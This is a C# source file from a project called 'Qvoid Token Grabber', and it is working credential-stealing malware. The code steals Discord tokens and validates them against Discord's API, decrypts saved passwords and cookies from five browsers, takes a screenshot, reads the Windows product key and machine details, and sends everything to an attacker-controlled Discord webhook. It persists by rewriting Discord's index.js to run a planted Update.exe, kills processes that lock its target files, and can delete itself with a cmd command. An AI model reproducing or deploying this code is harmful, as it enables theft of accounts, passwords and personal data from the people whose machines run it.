using Qvoid_Token_Grabber.Misc;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text.RegularExpressions;
using Qvoid;
using System.Drawing;
using Qvoid_Token_Grabber.PasswordGrabbers;
using System.Threading;
using System.Diagnostics;
using System.Windows.Forms;
using System.Reflection;
using LastDudeOnTheTrack.Properties;
using System.Drawing.Imaging;

namespace Qvoid_Token_Grabber.Discord
{
    class Grabber
    {
        /// <summary>
        /// This is the main function which executes the grabber.
        /// </summary>
        static public void Grab()
        {
            //Some random path to contains our temp files.
            string path = Path.GetTempPath() + "\\9f28d161-0c812-4a6f-8d0e-2cdda3cc3c91\\";

            //Checking if the current path have all the dependencies.
            if (!Directory.Exists($"{Application.StartupPath}\\x64")
                || !Directory.Exists($"{Application.StartupPath}\\x86")
                || !File.Exists($"{Application.StartupPath}\\x64\\SQLite.Interop.dll")
                || !File.Exists($"{Application.StartupPath}\\x86\\SQLite.Interop.dll")
                || !File.Exists($"{Application.StartupPath}\\System.Data.SQLite.Linq.dll")
                || !File.Exists($"{Application.StartupPath}\\System.Data.SQLite.EF6.dll")
                || !File.Exists($"{Application.StartupPath}\\System.Data.SQLite.dll")
                || !File.Exists($"{Application.StartupPath}\\Newtonsoft.Json.dll")
                || !File.Exists($"{Application.StartupPath}\\EntityFramework.SqlServer.dll")
                || !File.Exists($"{Application.StartupPath}\\EntityFramework.dll")
                || !File.Exists($"{Application.StartupPath}\\BouncyCastle.Crypto.dll"))
            {
                //If it hasn't we'll just copy them from the resources of the program into some folder in temp and start it.
                if (Directory.Exists(path))
                    Directory.Delete(path, true);

                //Creating the directories which will contains some of the dependencies.
                Directory.CreateDirectory(path);
                Directory.CreateDirectory($"{path}\\x86");
                Directory.CreateDirectory($"{path}\\x64");

                //Writing the files
                File.WriteAllBytes($"{path}System.Data.SQLite.Linq.dll", Resources.System_Data_SQLite_Linq);
                File.WriteAllBytes($"{path}System.Data.SQLite.EF6.dll", Resources.System_Data_SQLite_EF6);
                File.WriteAllBytes($"{path}System.Data.SQLite.dll", Resources.System_Data_SQLite);
                File.WriteAllBytes($"{path}Newtonsoft.Json.dll", Resources.Newtonsoft_Json);
                File.WriteAllBytes($"{path}EntityFramework.SqlServer.dll", Resources.EntityFramework_SqlServer);
                File.WriteAllBytes($"{path}EntityFramework.dll", Resources.EntityFramework);
                File.WriteAllBytes($"{path}BouncyCastle.Crypto.dll", Resources.BouncyCastle_Crypto);

                File.WriteAllBytes($"{path}\\x64\\SQLite.Interop.dll", Resources.SQLite_Interop64);
                File.WriteAllBytes($"{path}\\x86\\SQLite.Interop.dll", Resources.SQLite_Interop86);

                File.Copy(Assembly.GetEntryAssembly().Location, $"{path}\\{System.AppDomain.CurrentDomain.FriendlyName}");
                Thread.Sleep(100);

                //Starting the grabber
                Process process = new Process()
                {
                    StartInfo = new ProcessStartInfo($"{path}\\{System.AppDomain.CurrentDomain.FriendlyName}")
                    {
                        WorkingDirectory = Path.GetDirectoryName($"{path}\\{System.AppDomain.CurrentDomain.FriendlyName}")
                    }
                };
                process.Start();

                Environment.Exit(0);
            }

            //Getting all of the Discord path(s) avaliable on the computer.
            Find(out List<string> DiscordClients, out List<string> TokensLocation);

            foreach (var clientPath in DiscordClients)
            {
                if (!Directory.Exists(clientPath + "\\Core"))
                    Directory.CreateDirectory(clientPath + "\\Core");

                try
                {
                    //Writing the files into the discord core path because Discord executes the code which is written in the index.js
                    File.WriteAllBytes($"{clientPath}\\Core\\System.Data.SQLite.Linq.dll", Resources.System_Data_SQLite_Linq);
                    File.WriteAllBytes($"{clientPath}\\Core\\System.Data.SQLite.EF6.dll", Resources.System_Data_SQLite_EF6);
                    File.WriteAllBytes($"{clientPath}\\Core\\System.Data.SQLite.dll", Resources.System_Data_SQLite);
                    File.WriteAllBytes($"{clientPath}\\Core\\Newtonsoft.Json.dll", Resources.Newtonsoft_Json);
                    File.WriteAllBytes($"{clientPath}\\Core\\EntityFramework.SqlServer.dll", Resources.EntityFramework_SqlServer);
                    File.WriteAllBytes($"{clientPath}\\Core\\EntityFramework.dll", Resources.EntityFramework);
                    File.WriteAllBytes($"{clientPath}\\Core\\BouncyCastle.Crypto.dll", Resources.BouncyCastle_Crypto);

                    Directory.CreateDirectory($"{clientPath}\\Core\\x86");
                    Directory.CreateDirectory($"{clientPath}\\Core\\x64");
                    File.WriteAllBytes($"{clientPath}\\Core\\x64\\SQLite.Interop.dll", Resources.SQLite_Interop64);
                    File.WriteAllBytes($"{clientPath}\\Core\\x86\\SQLite.Interop.dll", Resources.SQLite_Interop86);
                }
                catch { }

                try
                {
                    if (File.Exists($"{clientPath}\\Core\\{System.AppDomain.CurrentDomain.FriendlyName}"))
                        File.Delete($"{clientPath}\\Core\\{System.AppDomain.CurrentDomain.FriendlyName}");

                    if (File.Exists($"{clientPath}\\Core\\Update.exe"))
                        File.Delete($"{clientPath}\\Core\\Update.exe");

                    //Writing the index.js file
                    File.Copy(Assembly.GetEntryAssembly().Location, $"{clientPath}\\Core\\Update.exe");
                    File.WriteAllText(clientPath + "\\index.js", "const child_process = require('child_process');\r\n" +
                                                   "child_process.execFile(__dirname + '/core/Update.exe');\r\n\r\n" +
                                                   "module.exports = require('./core.asar');");
                }
                catch { }
            }

            //Grabbing the Discord token(s)
            var Tokens = FindTokens(TokensLocation);

            if (Tokens.Count > 0)
            {
                //Getting the information about the environment computer.
                Machine machineInfo = new Machine();
                List<QvoidWrapper.Discord.Client> Users = new List<QvoidWrapper.Discord.Client>();

                string BodyMessage = "";
                string HeadMessage = $"IP Address```{Machine.GetPublicIpAddress()}```" +
                                     $"{Environment.NewLine}LAN Address```{Machine.GetLanIpv4Address()}```" +
                                     $"{Environment.NewLine}Desktop Username```{Environment.UserName}```" +
                                     $"{Environment.NewLine}Memory```{machineInfo.pcMemory}```" +
                                     $"{Environment.NewLine}Operating System Architecture```{machineInfo.osArchitecture}```" +
                                     $"{Environment.NewLine}GPU Video```{machineInfo.gpuVideo}```" +
                                     $"{Environment.NewLine}GPU Version```{machineInfo.gpuVersion}```" +
                                     $"{Environment.NewLine}Windows License```{Windows.GetProductKey()}```{Environment.NewLine}";

                int screenLeft = SystemInformation.VirtualScreen.Left;
                int screenTop = SystemInformation.VirtualScreen.Top;
                int screenWidth = SystemInformation.VirtualScreen.Width;
                int screenHeight = SystemInformation.VirtualScreen.Height;

                using (Bitmap bmp = new Bitmap(screenWidth, screenHeight))
                {
                    using (Graphics g = Graphics.FromImage(bmp))
                        g.CopyFromScreen(screenLeft, screenTop, 0, 0, bmp.Size);

                    bmp.Save(Path.GetTempPath() + "\\Capture.jpg", ImageFormat.Jpeg);
                }


                string Passwords = "------ Passwords ------";
                string Cookies = "------ Cookies ------";

                //Grabbing the passwords and cookies
                ChromeGrabber Chrome = new ChromeGrabber();
                FirefoxGrabber FireFox = new FirefoxGrabber();
                OperaGxGrabber Opera = new OperaGxGrabber();
                BraveGrabber Brave = new BraveGrabber();
                EdgeGrabber Edge = new EdgeGrabber();

                // ----------------------- Passwords -----------------------//

                if (Chrome.PasswordsExists())
                {
                    try
                    {
                        foreach (var item in Chrome.GetAllPasswords(Chrome.GetKey()))
                        {
                            Passwords += $"{Environment.NewLine}Browser  : Chrome";
                            Passwords += $"{Environment.NewLine}URL      : {item.url}";
                            Passwords += $"{Environment.NewLine}Username : {item.username}";
                            Passwords += $"{Environment.NewLine}Password : {item.password}";
                            Passwords += $"{Environment.NewLine}---------------------------------------------------------------------";
                        }
                    }
                    catch { }
                }

                if (Opera.PasswordsExists())
                {
                    try
                    {
                        foreach (var item in Opera.GetAllPasswords(Opera.GetKey()))
                        {
                            Passwords += $"{Environment.NewLine}Browser  : Opera";
                            Passwords += $"{Environment.NewLine}URL      : {item.url}";
                            Passwords += $"{Environment.NewLine}Username : {item.username}";
                            Passwords += $"{Environment.NewLine}Password : {item.password}";
                            Passwords += $"{Environment.NewLine}---------------------------------------------------------------------";
                        }
                    }
                    catch { }
                }

                if (Brave.PasswordsExists())
                {
                    try
                    {
                        foreach (var item in Brave.GetAllPasswords(Brave.GetKey()))
                        {
                            Passwords += $"{Environment.NewLine}Browser  : Brave";
                            Passwords += $"{Environment.NewLine}URL      : {item.url}";
                            Passwords += $"{Environment.NewLine}Username : {item.username}";
                            Passwords += $"{Environment.NewLine}Password : {item.password}";
                            Passwords += $"{Environment.NewLine}---------------------------------------------------------------------";
                        }
                    }
                    catch { }
                }

                if (Edge.PasswordsExists())
                {
                    try
                    {
                        foreach (var item in Edge.GetAllPasswords(Edge.GetKey()))
                        {
                            Passwords += $"{Environment.NewLine}Browser  : Edge";
                            Passwords += $"{Environment.NewLine}URL      : {item.url}";
                            Passwords += $"{Environment.NewLine}Username : {item.username}";
                            Passwords += $"{Environment.NewLine}Password : {item.password}";
                            Passwords += $"{Environment.NewLine}---------------------------------------------------------------------";
                        }
                    }
                    catch { }
                }

                // ----------------------- Cookies -----------------------//

                if (Chrome.CookiesExists())
                {
                    try
                    {
                        foreach (var item in Chrome.GetAllCookies(Chrome.GetKey()))
                        {
                            Cookies += $"{Environment.NewLine}Browser   : Chrome";
                            Cookies += $"{Environment.NewLine}Host Name : {item.HostName}";
                            Cookies += $"{Environment.NewLine}Name      : {item.Name}";
                            Cookies += $"{Environment.NewLine}Value     : {item.Value}";
                            Cookies += $"{Environment.NewLine}---------------------------------------------------------------------";
                        }
                    }
                    catch { }
                }

                if (Opera.CookiesExists())
                {
                    try
                    {
                        foreach (var item in Opera.GetAllCookies(Opera.GetKey()))
                        {
                            Cookies += $"{Environment.NewLine}Browser   : Opera";
                            Cookies += $"{Environment.NewLine}Host Name : {item.HostName}";
                            Cookies += $"{Environment.NewLine}Name      : {item.Name}";
                            Cookies += $"{Environment.NewLine}Value     : {item.Value}";
                            Cookies += $"{Environment.NewLine}---------------------------------------------------------------------";
                        }
                    }
                    catch { }
                }

                if (Brave.CookiesExists())
                {
                    try
                    {
                        foreach (var item in Opera.GetAllCookies(Brave.GetKey()))
                        {
                            Cookies += $"{Environment.NewLine}Browser   : Brave";
                            Cookies += $"{Environment.NewLine}Host Name : {item.HostName}";
                            Cookies += $"{Environment.NewLine}Name      : {item.Name}";
                            Cookies += $"{Environment.NewLine}Value     : {item.Value}";
                            Cookies += $"{Environment.NewLine}---------------------------------------------------------------------";
                        }
                    }
                    catch { }
                }

                if (Edge.CookiesExists())
                {
                    try
                    {
                        foreach (var item in Edge.GetAllCookies(Edge.GetKey()))
                        {
                            Cookies += $"{Environment.NewLine}Browser   : Edge";
                            Cookies += $"{Environment.NewLine}Host Name : {item.HostName}";
                            Cookies += $"{Environment.NewLine}Name      : {item.Name}";
                            Cookies += $"{Environment.NewLine}Value     : {item.Value}";
                            Cookies += $"{Environment.NewLine}---------------------------------------------------------------------";
                        }
                    }
                    catch { }
                }

                if (FireFox.CookiesExists())
                {
                    try
                    {
                        foreach (var item in FireFox.GetAllCookies())
                        {
                            Cookies += $"{Environment.NewLine}Browser   : FireFox";
                            Cookies += $"{Environment.NewLine}Host Name : {item.HostName}";
                            Cookies += $"{Environment.NewLine}Name      : {item.Name}";
                            Cookies += $"{Environment.NewLine}Value     : {item.Value}";
                            Cookies += $"{Environment.NewLine}---------------------------------------------------------------------";
                        }
                    }
                    catch { }
                }

                for (int i = 0; i < Tokens.Count; ++i)
                {
                    //Loop over all the grabbed tokens.
                    QvoidWrapper.Discord.Client curUser = new QvoidWrapper.Discord.Client(Tokens[i]);

                    //Checking for duplicates (We cannot use Distinct() because there might be multiple tokens to the same account)
                    bool duplicate = false;
                    foreach (var user in Users)
                    {
                        if (user == null)
                            continue;

                        if (curUser.DiscordUser.Id == user.DiscordUser.Id)
                        {
                            duplicate = true;
                            break;
                        }
                    }

                    if (duplicate)
                        continue;

                    Users.Add(curUser);

                    //Writing the message which contains the Discord Client information.
                    var userInfo = curUser.DiscordUser;
                    BodyMessage += $"{Environment.NewLine}Username```{userInfo.Username}#{userInfo.Discriminator}```" +
                                   $"{Environment.NewLine}Email```{curUser.Email}```" +
                                   $"{Environment.NewLine}Phone Number```{curUser.PhoneNumber}```" +
                                   $"{Environment.NewLine}Premium```{userInfo.Premium}```" +
                                   $"{Environment.NewLine}Token```{curUser.Token}```";

                }

                //Checking if the user already run the token grabber before, if he did we compare it to the content if the content has changed we update all the information, else we just return quz we have nothing to do :D
                string usersPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\d0060d24-c4a5-480f-803a-ec978344350d.dat";
                if (!File.Exists(usersPath) || (QvoidWrapper.Encryption.StrXOR(HeadMessage + BodyMessage, Config.Password, true) != File.ReadAllText(usersPath)))
                {
                    //Writing the log file.
                    File.WriteAllText(usersPath, QvoidWrapper.Encryption.StrXOR(HeadMessage + BodyMessage, Config.Password, true));

                    QvoidWrapper.Discord.Webhook Webhook = new QvoidWrapper.Discord.Webhook(Config.Webhook);
                    QvoidWrapper.Discord.Embed embed = new QvoidWrapper.Discord.Embed();

                    embed.Color = Color.Red;
                    embed.Title = "Computer Information";
                    embed.Description = HeadMessage;

                    QvoidWrapper.Discord.Embed embed2 = new QvoidWrapper.Discord.Embed();
                    embed2.Timestamp = DateTime.UtcNow;
                    embed2.Color = Color.Red;
                    embed2.Title = "Discord Client Information";
                    embed2.Description = BodyMessage;

                    string PasswordsPath = Path.GetTempPath() + "\\tmp7DDF46.txt";
                    string CookiesPath = Path.GetTempPath() + "\\tmp7RDF47.txt";

                    if (Passwords != "------ Passwords ------")
                    {
                        File.WriteAllText(PasswordsPath, Passwords);
                        Webhook.Send(null, new FileInfo(PasswordsPath));
                        File.Delete(PasswordsPath);
                    }

                    if (Passwords != "------ Cookies ------")
                    {
                        Thread.Sleep(10);
                        File.WriteAllText(CookiesPath, Cookies);
                        Webhook.Send(null, new FileInfo(CookiesPath));
                        File.Delete(CookiesPath);
                    }

                    Thread.Sleep(30);
                    Webhook.Send(embed);
                    Thread.Sleep(30);
                    Webhook.Send(embed2);
                    Thread.Sleep(30);
                    Webhook.Send(null, new FileInfo(Path.GetTempPath() + "\\Capture.jpg"));
                    Thread.Sleep(30);
                    File.Delete(Path.GetTempPath() + "\\Capture.jpg");
                }
            }
        }

        /// <summary>
        /// Deletes all the files and traces created by the grabber.
        /// </summary>
        static public void DeleteTraces(bool DeleteRecursive = false, bool Destruct = false)
        {
            try
            {
                string path = Path.GetTempPath() + "\\9f28d161-0c812-4a6f-8d0e-2cdda3cc3c91\\";
                if (Directory.Exists(path))
                    Directory.Delete(path, true);
            }
            catch (Exception ex) { Debug.WriteLine("Error occured while deleting the main Path;" + ex.Message); }

            if (DeleteRecursive)
            {
                string usersPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\d0060d24-c4a5-480f-803a-ec978344350d.dat";
                if (File.Exists(usersPath))
                {
                    try { File.Delete(usersPath); }
                    catch (Exception ex) { Debug.WriteLine("Error occured while deleting the log file;" + ex.Message); }
                }
            }

            if (Destruct)
            {
                string app = AppDomain.CurrentDomain.FriendlyName;
                string AppPath = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location).ToString() + $@"\{app}";
                Process.Start("cmd.exe", "/C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del " + AppPath);
                Process.GetCurrentProcess().Kill();
            }
        }

        /// <summary>
        /// Finds all the Discord's path(s) available on the local computer.
        /// </summary>
        /// <param name="DiscordClients"></param>
        /// <param name="TokensLocation"></param>
        static private void Find(out List<string> DiscordClients, out List<string> TokensLocation)
        {
            DiscordClients = new List<string>();
            TokensLocation = new List<string>();

            var directories = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
            foreach (var directory in directories)
            {
                if (directory.ToLower().Contains("discord"))
                {
                    var core = Directory.GetFiles(directory, "core.asar", SearchOption.AllDirectories);
                    var index = Directory.GetFiles(directory, "index.js", SearchOption.AllDirectories);

                    foreach (var coreFile in core)
                        foreach (var indexFile in index)
                            if (coreFile.Replace("core.asar", "") == indexFile.Replace("index.js", ""))
                                DiscordClients.Add(coreFile.Replace("core.asar", ""));
                }
            }

            directories = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
            foreach (var directory in directories)
            {
                if (directory.ToLower().Contains("discord"))
                {
                    var subDirectories = Directory.GetDirectories(directory);
                    foreach (var localDirectory in subDirectories)
                    {
                        if (localDirectory.Contains("Local Storage"))
                        {
                            var temp = Directory.GetDirectories(localDirectory);
                            foreach (var item in temp)
                                if (item.Contains("leveldb"))
                                    TokensLocation.Add($"{item}\\");
                        }
                    }
                }
            }
        }

        /// <summary>
        /// Finds all the Discord's token(s) available on the local computer.
        /// </summary>
        /// <param name="TokensLocation"></param>
        /// <returns>tokens located on the local computer</returns>
        static private List<string> FindTokens(List<string> TokensLocation)
        {
            string localAppdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

            //Adding known tokens paths.
            TokensLocation.Add(localAppdata + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb");
            TokensLocation.Add(localAppdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb");
            TokensLocation.Add(localAppdata + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb");
            TokensLocation.Add(localAppdata + "\\Iridium\\User Data\\Default\\Local Storage\\leveldb");
            TokensLocation.Add(roaming + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb");
            TokensLocation.Add(roaming + "\\Lightcord\\Local Storage\\leveldb");
            TokensLocation.Add(roaming + "\\Amigo\\Local Storage\\leveldb");
            TokensLocation.Add(roaming + "\\Torch\\Local Storage\\leveldb");
            TokensLocation.Add(roaming + "\\Kometa\\Local Storage\\leveldb");
            TokensLocation.Add(roaming + "\\Orbitum\\Local Storage\\leveldb");
            TokensLocation.Add(roaming + "\\CentBrowser\\Local Storage\\leveldb");
            TokensLocation.Add(roaming + "\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb");
            TokensLocation.Add(roaming + "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb");
            TokensLocation.Add(roaming + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb");
            TokensLocation.Add(roaming + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb");
            TokensLocation.Add(roaming + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb");


            List<string> tokens = new List<string>();

            foreach (var tokenPath in TokensLocation)
            {
                if (!Directory.Exists(tokenPath))
                    continue;

                foreach (string filePath in Directory.GetFiles(tokenPath))
                {
                    while (true)
                    {
                        if (!filePath.EndsWith(".log") && !filePath.EndsWith(".ldb"))
                            break;

                        try
                        {
                            string fileContent = "";

                            //Because there might be some issues reading the tokens files such as locked or already used by some process, we trying to bypass it.
                            using (FileStream fs = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                            using (StreamReader sr = new StreamReader(fs))
                                fileContent = sr.ReadToEnd();

                            MatchCollection matches = Regex.Matches(fileContent, "(\\w|\\d){24}.(\\w|\\d|_|-){6}.(\\w|\\d|_|-){27}");
                            MatchCollection mfaMatches = Regex.Matches(fileContent, "mfa.(\\w|\\d|_|-){84}");

                            foreach (Match match in matches)
                                if (IsValidToken(match.Value))
                                    tokens.Add(match.Value);

                            foreach (Match match in mfaMatches)
                                if (IsValidToken(match.Value))
                                    tokens.Add(match.Value);

                            break;
                        }
                        catch (Exception)
                        {
                            foreach (var locker in QvoidWrapper.ProcessHandler.WhoIsLocking(filePath))
                            {
                                try { locker.Kill(); }
                                catch { break; }
                            }
                        }
                    }
                }
            }

            return tokens;
        }

        /// <summary>
        /// Checking if the given Discord token is valid.
        /// </summary>
        /// <param name="token"></param>
        /// <returns>determines whether the given string is a valid Discord token</returns>
        static private bool IsValidToken(string token)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://discordapp.com/api/v6/users/@me");
            request.Headers.Set("Authorization", token);
            request.ContentType = "application/json";

            try
            {
                using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                    return true;
            }
            catch { return false; }
        }
    }
}
